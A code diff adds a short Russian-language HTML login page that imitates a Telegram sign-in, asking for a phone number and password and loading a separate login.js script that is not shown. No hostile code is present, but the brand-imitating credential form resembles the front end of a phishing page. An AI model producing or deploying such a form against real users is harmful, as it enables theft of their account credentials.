@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Вход</title>
+  <link rel="stylesheet" href="login.css">
+</head>
+
+<body>
+
+
+<button id="skipBtn" title="Пропустить"></button>
+
+<div class="container">
+  <div class="logo">Telegram</div>
+  <h2>Войдите в аккаунт</h2>
+  <p class="subtitle">Введите номер телефона</p>
+
+  <div id="error" class="error">Введите номер и пароль</div>
+
+  <form id="loginForm" novalidate>
+    <input type="text" id="phone" placeholder="+7 999 123 45 67">
+    <input type="password" id="password" placeholder="Пароль">
+    <button type="submit">Вход</button>
+  </form>
+</div>
+
+<script src="javascript/login.js"></script>
+
+</body>
+</html>
